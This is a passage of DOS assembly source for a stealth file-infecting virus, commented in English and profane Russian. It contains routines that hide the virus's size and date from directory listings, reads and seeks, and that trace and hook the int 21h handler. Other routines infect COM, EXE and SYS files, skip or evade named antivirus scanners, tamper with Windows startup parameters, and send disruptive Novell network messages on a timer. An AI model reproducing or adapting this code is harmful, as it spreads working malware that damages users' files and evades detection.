▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; date stealth ── called by 57h
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 datestealth:
        or      al,al
        jnz     set_date
        call    int21
        call    hidestm
        jmp     ireturn

 set_date:
        call    int21
        call    correctdate
        jmp     ireturn

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; dta size/date stealth ── called by 4Eh/4Fh
; no extension check (infected.exe could be renamed to fuckup.fun)
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 dtastealth:
        call    int21                   ; find file!
        pushall                         ; save all 16-bit registers (exc. SP)
        jc      no_stealth              ; nothing to do?
        cmp     cs:stf,0                ; can we stealth?
        jnz     no_stealth              ; we can't stealth
        mov     ah,2Fh                  ; get current DTA address
        call    int21
        lea     si,[bx+18h]             ; si points to file date
        lea     di,[bx+1Ah]             ; di points to file size
        call    sizst                   ; stealth real file size!
 no_stealth:
        popall                          ; reset all 16-bit registers
        jmp     ireturn                 ; show the false to user!

; ----= SIZE STEALTH =----
 sizst: mov     dx,word ptr es:[si]     ; ax = filedate
        call    hidestm                 ; verify and hide stamp
        jnc     no_hide                 ; if no stamp set ;(
        mov     word ptr es:[si],dx     ; save it in DTA
        mov     dx,word ptr es:[di+2]   ; dx:ax = filesize
        mov     ax,word ptr es:[di]
        sub     ax,vsize
        sbb     dx,0
        jc      no_hide
        stosw
        xchg    ax,dx
        stosw
 no_hide:
        ret

; ----= DATE CORRECT =----
 correctdate:
        mov     ax,5700h                ; dos function: get file time/date
        call    int21
        call    hidestm                 ; reset file date stamp
        call    inf?                    ; file is already infected?
        jnc     perfectly
        ror     dh,1
        add     dh,100
        rol     dh,1
 perfectly:
        mov     ax,5701h                ; set new, corrected file stamp
        call    int21
        ret

; ----= HIDE STAMP =----
 hidestm:
        push    dx                      ; store dx on stack
        shr     dh,1                    ; get stamp in dh
        cmp     dh,100                  ; above 100?
        pop     dx                      ; reset dx
        jb      good_stm
        ror     dh,1                    ; prepare dx
        sub     dh,100                  ; hide real stamp
        rol     dh,1                    ; reset dx
        stc
        ret
 good_stm:
        clc
        ret





▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; allow/disable fcb stealth
; virus disables fcb stealth on get dpb (32h) to avoid chkdsk (or other shit)
; mistakes
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 terminate:
        mov     cs:drf,0
        jmp     runaway

 getdpb:
        mov     cs:drf,1
 runaway:
        jmp     exithandler

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; lseek stealth
; избегаем возможности попадания lseek'а на тело вируса
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 seekstealth:
        cmp     cs:stf ,0   ; всякие RAR'ы бегут?
        jnz     nostealth
        call    handlecheck         ; дисковый файл?
        jc      nostealth
        call    inf?                ; инфицирован?
        jnc     nostealth

        cmp     al,2                ; прикрываем жопу вируса?
        je      hide_eof

        call    int21
        jc      st_ret

        call    seeksave
        call    seekhide
        mov     ax,cs:seek_pos
        mov     dx,cs:seek_pos+2
        clc
 st_ret:
        jmp     ireturn

 hide_eof:
        sub     dx,vsize
        sbb     cx,0

 nostealth:
        jmp     exithandler


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; read stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 readstealth:
        cmp     cs:stf ,0       ; всякие RAR'ы бегут?
        jnz     nostealth
        call    handlecheck         ; дисковый файл?
        jc      nostealth
        call    inf?                ; инфицирован?
        jnc     nostealth

        call    int21               ; читаем че просят
        jc      st_ret
        pushf                       ; сохранить регистры
        pusha
        mov     bp,dx               ; адрес буфера куда читать
        mov     cs:nrbytes,ax       ; количество прочитанных байт

        cmp     dword ptr cs:seek_pos,28    ; читают заголовок?
        jae     virsubtract
        call    load_original       ; выдрать оригинальное начало этого файла

        lea     si,buffer           ; смещение начала замещаемых байт
        add     si,cs:seek_pos

        mov     cx,cs:nrbytes       ; считаем количество байт которые нам нужно
        add     cx,cs:seek_pos      ; состелсить
        cmp     cx,28
        jbe     overwrite
        mov     cx,28
        sub     cx,cs:seek_pos

 overwrite:
        mov     al,cs:[si]          ; переносим заголовок
        mov     ds:[bp],al
        inc     si
        inc     bp
        loop    overwrite

 virsubtract:
        call    seeksave        ; заполняем переменую "seek_pos" текущим
        call    seekhide        ; значением положения lseek'а и стелсим
        popa                    ; приращение длины файла
        popf
        mov     ax,cs:nrbytes   ; прочитал ax байт...
        jmp     ireturn

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; лечим вирусоносителя (когда в него че-нибудь записывают)
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 writehandler:
        cmp     cs:stf ,0   ; всякие RAR'ы бегут?
        jne     nowrite
        call    handlecheck         ; дисковый файл?
        jc      nowrite
        call    inf?                ; инфицирован?
        jnc     nowrite

        call    seeksave            ; сохраняем указатель записи

        pusha                       ; извратимся на регистрами
        push    ds cs
        pop     ds

        call    load_original       ; оригинальное начало -> в буфер
        call    seek2bof            ; указатель -> в начало файла
        mov     ah,40h              ; пишем оригинальное начало файла
        mov     cx,28               ; 28 байт из буфера
        lea     dx,buffer
        call    int21
        jc      disfail             ; ошибка? ну тогда при записи того,
        xor     cx,ax               ; чего просят ошибка будет тоже!
        jnz     disfail

        mov     cx,-1               ; двигаемся к началу тела вируса
        mov     dx,-vsize           ; или концу зараженной программы
        call    seekfrom_eof
        mov     ah,40h              ; кастрируем файл (удаляем тело вируса
        xor     cx,cx               ; из вирусоносителя
        call    int21
        mov     ah,68h              ; пишем все данные на диск
        call    int21
 disfail:
        call    restoreseek         ; восстанавливаем lseek
        pop     ds                  ; восстанавливаем регистры
        popa
 nowrite:
        jmp     exithandler         ; выходим

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Ah=18h,AL=0DDh: TSR test
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 tsrtest:
        cmp     al,0ddh
        jne     tsrexit
        mov     ax,0303h
        jmp     ireturn

 tsrexit:
        jmp     exithandler

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; ════════════════════════> S·U·B·R·O·U·T·I·N·E·S <═════════════════════════
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; подпрограмма для проверки файла (bx=handle) на зараженность
; cf=1 если заражен
 inf?:
       pusha                    ; сохранить в стеке регистры
       push    ds es
       push    cs cs
       pop     ds es

       call    seeksave         ; сохраняем позицию lseek
       mov     cx,-1            ; двигаемся к началу подпрограммы "extra"
       mov     dx,-(eov-extra)  ; (по ней будем сверять)
       call    seekfrom_eof

       mov     ah,3fh           ; читаем подпрограмму в "buffer"
       mov     cx,(eov-extra)
       lea     dx,buffer
       call    int21
       call    restoreseek      ; восстановить позицию lseek
       xor     cx,ax            ; все прочиталось?
       jnz     not_infected

       lea     si,buffer
       lea     di,extra
       mov     cx,eov-extra
       cld
       repe     cmpsb
       jne      not_infected

 infected:
       stc
       pop     es ds
       popa
       ret

 not_infected:
       clc
       jmp      infected+1

; подпрограмма для выкапывания оригинального начала зараженной программы
; на входе: bx - handler
; на выходе: "buffer" с оригинальным расшифрованным началом
; сохраняет позицию lseek в файле

 load_original:
        pushall                 ; save all 16-bit registers (exc. SP)
        push    cs cs
        pop     ds es

        xor     cx,cx           ; remember the current lseek position
        xor     dx,dx
        call    seekfrom_cur
        push    ax dx

        mov     cx,-1            ; seek to the virus start (-vsize bytes
        mov     dx,-vsize        ; from end of file)
        call    seekfrom_eof     ;
        mov     ah,3fh           ; read virus body to the buffer
        mov     cx,vsize
        lea     dx,buffer
        call    int21

        pop     cx dx            ; восстанавливаем позицию lseek в
        call    seekfrom_bof     ; зараженной программе

        mov     byte ptr [buffer+(cr_ret-ksenia)],0cbh
        lea     ax,buffer
        cwd
        mov     cx,16
        div     cx
        mov     cx,cs
        add     ax,cx
        add     dx,crypt-ksenia
        push    cs offset retc
        push    ax dx
        retf

 retc:
        lea     si,[buffer+(original-ksenia)]
        lea     di,buffer
        mov     cx,28
        cld
        rep     movsb

        popall
        ret

; Хирургическая обработка прерывания int 21h
 cr21z:
       pusha                    ; сохранить регистры
       push    ds es
       push    cs cs
       pop     ds es

       in      al,40h
       sub     al,70h
       jnc     $-2
       add     al,80h+70h
       mov     splint,al

       mov     ah,25h
       lea     dx,tsr
       int     21h

       cmp     word ptr original,0ffffh
       jz      my_int
       mov     ax,1600h
       int     2fh
       or      al,al
       jz      no_win

 my_int:
       mov     ax,3521h
       int     21h
       mov     win21,bx
       mov     win21+2,es
       mov     ax,2521h
       lea     dx,win_trick
       int     21h
       jmp     motherfucker

 no_win:
       mov     si,30h*4         ; найти оригинальный вектор прерывания
 nextchain:                     ; int 21h
       cmp     byte ptr [si],0eah       ; прямой дальний джамп?
       jne     another_way
       lds     si,[si+1]                ; загрузить в ds:si ссылку джампа
       cmp     word ptr [si],9090h      ; там находятся 2 nop'а?
       jnz     nextchain
       sub     si,32h                   ; а если взять пораньше?
       cmp     word ptr [si],9090h      ; nop/nop
       je      gotreal                  ; call far [....]

 another_way:
       cmp     word ptr [si],2e1eh      ; push ds
       jne     motherfucker             ; cs:[...]?
       add     si,25h                   ; а дальше?
       cmp     word ptr [si],80fah      ; cli
       je      gotreal                  ; cmp ah,[..]

 motherfucker:                  ; че то меня понесло...
       push    0
       pop     ds
       lds     si,ds:[84h]      ; ладно, хуй с ним
 gotreal:
       mov     cs:io21,si       ; засовываем че нашли в ячейку памяти
       mov     cs:io21+2,ds
       mov     ax,ds:[si]       ; читаем 2 первые байта обработчика
       mov     cs:prev2,ax      ; сохраняем их

       push    cs
       pop     ds
       mov     ax,3501h
       int     21h
       mov     io1,bx
       mov     io1+2,es
       mov     ax,2501h
       lea     dx,trace
       int     21h

       pushf                    ; сохранить в стеке адрес
       push    cs               ; возврата
       push    offset trace_post

       pushf                    ; сохранить в стеке флаги со
       pop     ax               ; включенным битом трассировки
       or      ah,1
       push    ax
       push    dword ptr io21     ; и загрузить адрес 21-го обработчика
       mov     ah,30h             ; невинная функция dos
       iret                       ; перейти в режим трассировки

 trace_post:
       pop     es ds            ; здеся мы кончили...........
       popa
       ret

 trace:
       push    eax bp ds        ; трассировка 21-го

       mov     ax,cs:io21       ; взять смещение
       inc     ax
       mov     bp,sp
       cmp     [bp+8],ax        ; выполнились ли первые
       je      nextcmd          ; два байта обработчика?

       and     word ptr [bp+12],0feffh  ; убрать флаг трассировки
       mov     eax,[bp+8]               ; считать адрес следующей инструкции
       mov     dword ptr cs:_addr21,eax
       push    0                        ; ds=0
       pop     ds
       push    dword ptr cs:io1         ; восстановить 1-й вектор
       pop     dword ptr ds:[4]

 nextcmd:
       pop     ds bp eax       ; выход из прерывания
       iret                    ; трассировки

 ; Verifyes MCB owner
 verifymcb:
        pusha
        push    ds es

        mov     ah,62h          ; get current psp segment
        call    int21
        dec     bx              ; get mcb segment
        mov     ds,bx
        mov     si,08h          ; name of the owner
        lea     di,stdisable
 cmpchar:
        mov     al,[si]         ; get char of the owner name
        call    upreg
        cmp     al,cs:[di]
        jne     nextname
        or      al,al
        jz      the_same
        inc     si
        inc     di
        cmp     si,10h
        je      the_same
        jmp     cmpchar
  nextname:
        inc     di
        cmp     byte ptr cs:[di],0
        jne     nextname
        inc     di
        cmp     byte ptr cs:[di],0ffh
        je      the_different
        mov     si,08h
        jmp     cmpchar
 the_same:
        mov     cs:stf,1
        jmp     quitvmcb
 the_different:
        mov     cs:stf,0
 quitvmcb:
        pop     es ds
        popa
        ret
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; sys infection ── called by infect, [di] = buffer
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 sysinfect:
        cmp     word ptr [di],0ffffh
        jne     cierr
        call    seek2eof
        or      dx,dx
        jnz     cierr
        cmp     ax,65035-vsize
        ja      cierr
        mov     word ptr [di+8],ax
        add     ax,(strategy-ksenia)
        xchg    word ptr [di+6],ax
        mov     word ptr old_strategy,ax
        clc
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; com infection ── called by infect, [di] = buffer
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 cominfect:
        cmp     word ptr [di],0ffffh
        je      cierr
        mov     al,0e9h
        stosb
        call    seek2eof
        or      dx,dx
        jnz     cierr
        cmp     ax,65035-vsize
        ja      cierr
        sub     ax,3
        stosw
        clc
        ret
 cierr: stc
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; exe infection ── called by infect, [di] = buffer
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 exeinfect:
        cmp     byte ptr [di+18h],'@'   ; NExe?
        je      exerr

        mov     ax,512                  ; get file size from header
        mov     cx,word ptr [di+4]
        cmp     word ptr [di+2],0
        jz      $+3
        dec     cx
        mul     cx
        add     ax,word ptr [di+2]
        adc     dx,0
        xchg    ax,si
        xchg    dx,di

        call    seek2eof                ; and the real size
        cmp     ax,si                   ; compare its
        jne     exerr
        cmp     dx,di
        jne     exerr

        push    ax dx                   ; get location in exe file
        mov     cx,16
        div     cx
        sub     ax,word ptr buffer+8
        mov     word ptr buffer+14h,dx
        mov     word ptr buffer+16h,ax
        inc     ax                      ; special for TBAV
        mov     word ptr buffer+0eh,ax
        mov     word ptr buffer+10h,3000h
        pop     dx ax

        add     ax,vsize                ; get pages/lst page lenght
        adc     dx,0
        mov     cx,512
        div     cx
        or      dx,dx
        jz      $+3
        inc     ax
        mov     word ptr buffer+2,dx
        mov     word ptr buffer+4,ax
        clc
        ret

 exerr: stc
        ret


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Тестирует файл на предмет незаражаемости + виндоус изврат
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 filenamecheck:         pusha                  ; сохранить регистры
                        mov     si,dx          ; si=dx
                        dec     si             ; dec+inc=0
 findend:               inc     si             ; найти конец
                        cmp     byte ptr [si],0
                        jne     findend

 findname:              dec     si             ; decrease si
                        cmp     byte ptr [si],'\'
                        je      gotname
                        cmp     byte ptr [si],':'
                        je      gotname
                        cmp     si,dx
                        jae     findname
 gotname:               inc     si              ; si=filename
                        mov     ax,[si]         ; get first chars
                        call    upreg
                        cmp     ax,'IW'         ; Windows?
                        je      winfound

 otherfiles:            cmp     ax,'IF'         ; FindVirus?
                        je      badfile
                        cmp     ax,'CS'         ; Scan?
                        je      badfile
                        cmp     ax,'SV'         ; VSafe/VShield?
                        je      badfile
                        cmp     ax,'BT'         ; Fucked TBSCAN?
                        je      badfile
                        cmp     ax,'RD'         ; DRWEB?
                        je      badfile
                        cmp     ax,'VA'         ; AVP?
                        je      badfile
                        cmp     ax,'-F'         ; F-PROT?
                        je      badfile
                        cmp     ax,'PF'         ; FPROT?
                        je      badfile
                        cmp     ax,'DA'         ; ADInf?
                        je      badfile
                        cmp     ax,'OC'         ; COMMAND interpreter?
                        je      badfile

                        clc                     ; filename is okay
                        popa
                        ret

 badfile:               stc                     ; bad file...
                        popa
                        ret

 winfound:              cmp     cs:func_number,4b00h   ; windows: EXECUTE?
                        jne     otherfiles
                        mov     ax,[si+2]              ; get second two chars
                        call    upreg                  ; uppercase
                        cmp     ax,'.N'                ; wiN.?
                        jne     otherfiles
                        mov     ax,[si+4]       ; get third two chars
                        call    upreg
                        cmp     ax,'OC'         ; win.CO?
                        jne     otherfiles

                        push    ds es           ; widows executing:
                        mov     si,es:[bx+2]    ; offset of command line
                        mov     ax,es:[bx+4]    ; get segment =es=ds
                        mov     ds,ax
                        mov     es,ax
                        mov     di,si           ; ds:si=es:di=comline
                        inc     di
                        cld
                        cmp     byte ptr [si],0 ; no parameters entered?
                        je      writeparam
                        mov     al,0dh          ; search for the cr(lf)
                        mov     cx,127
                        repne   scasb
                        jne     noparam         ; error?
                        dec     di
 writeparam:            mov     cx,6
                        add     byte ptr [si],5 ; increase lenght of
                        push    cs              ; the command line
                        pop     ds
                        lea     si,wino32bit
                        rep     movsb           ; write new params...
 noparam:               pop     es ds
                        clc                     ; exit, file is okay!
                        popa
                        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Checks the handle (Disk file?)
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 handlecheck:           pusha
                        mov     ax,4400h
                        call    int21
                        jc      hcerr
                        test    dl,80h
                        jnz     hcerr
                        clc
                        popa
                        ret

 hcerr:                 stc
                        popa
                        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; subroutine to decrease number of read bytes and remove lseek from virus zone
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 seekhide:              call    seek2eof
                        sub     ax,vsize
                        sbb     dx,0

                        cmp     dx,cs:seek_pos+2
                        jb      hidevirus
                        ja      not_us
                        cmp     ax,cs:seek_pos
                        jae     not_us

 hidevirus:             push    ax
                        sub     cs:seek_pos,ax
                        mov     ax,cs:seek_pos
                        sub     cs:nrbytes,ax  ; subtract number of read bytes
                        pop     ax
                        mov     cs:seek_pos,ax
                        mov     cs:seek_pos+2,dx

 not_us:                call    restoreseek
                        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; lseek tools
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 seeksave:              pusha
                        xor     cx,cx
                        xor     dx,dx
                        call    seekfrom_cur
                        mov     cs:seek_pos,ax
                        mov     cs:seek_pos+2,dx
                        popa
                        ret

 restoreseek:           pusha
                        mov     dx,cs:seek_pos
                        mov     cx,cs:seek_pos+2
                        call    seekfrom_bof
                        popa
                        ret

 seek2bof:              mov     ax,4200h
                        xor     cx,cx
                        mov     dx,cx
                        jmp     realseek

 seek2eof:              mov     ax,4202h
                        xor     cx,cx
                        xor     dx,dx
                        jmp     realseek

 seekfrom_eof:          mov     ax,4202h
                        jmp     realseek

 seekfrom_cur:          mov     ax,4201h
                        jmp     realseek

 seekfrom_bof:          mov     ax,4200h

 realseek:              call    int21
                        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Upper case AX
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 upreg:                 cmp     al,61h
                        jb      goodchar
                        cmp     al,7ah
                        ja      goodchar
                        sub     al,20h
 goodchar:              cmp     ah,61h
                        jb      _good_
                        cmp     ah,7ah
                        ja      _good_
                        sub     ah,20h
 _good_:                ret

; ЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁ
; ЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁ Всякая хуйня для Novell Network ЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁ
; ЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁЁ
 novell:                pushall

                        mov     ax,7a00h        ; Novell installation check
                        int     2fh
                        or      al,al
                        jz      no_novell

                        mov     ax,2ah          ; Который час? (день..)
                        call    int21
                        cmp     al,1            ; Понедельник?
                        jne     no_novell

                        mov     ah,2ch          ; 5 минут нн-го?
                        call    int21
                        cmp     cl,5
                        jne     no_send

                        push    cs cs
                        pop     ds es
                        cld
                        in      al,40h          ; случайное число
                        and     al,111b         ; [0..7]
                        mov     word ptr buffer,9eh
                        mov     byte ptr buffer+2,0 ; послать сообщение
                        mov     byte ptr buffer+3,1 ; 1 connection
                        mov     byte ptr buffer+4,al ; connection #
                        mov     byte ptr buffer+5,endnmess-nmess ; длина мессаги
                        lea     si,nmess
                        lea     di,buffer+6
                        mov     cx,endnmess-nmess
                        rep     movsb

                        mov     ah,0e1h         ; отправить фак
                        lea     si,buffer
                        lea     si,two_bytes
                        call    int21

                        mov     cx,60
                        lea     di,buffer+4
 fake_down:             mov     byte ptr [di],10
                        inc     di
                        loop    fake_down
                        mov     word ptr buffer,3eh
                        mov     byte ptr buffer+2,9
                        mov     byte ptr buffer+3,3ch ; длина сообщения
                        lea     si,buffer
                        lea     di,two_bytes
                        mov     ah,0e1h
                        call    int21
                        jmp     no_novell

 no_send:               cmp     ch,17
                        jne     no_novell
                        mov     ah,0d7h
                        call    int21

 no_novell:             popall
                        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; запись зашифрованного тела вируса в файл
; самое главное в этом вирусе (поставьте тута ret и все к е(и)бени матери)
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
  writevirus:
        mov     ax,5700h                ; запрос времени/даты последнего
        call    int21                   ; модифицирования файла
        push    dx cx                   ; сохранить в стеке

        mov     ah,2ch                  ; запрос текущего времени
        call    int21                   ; в dx:cx
        pop     ax                      ; восстановить в ax и сохранить снова
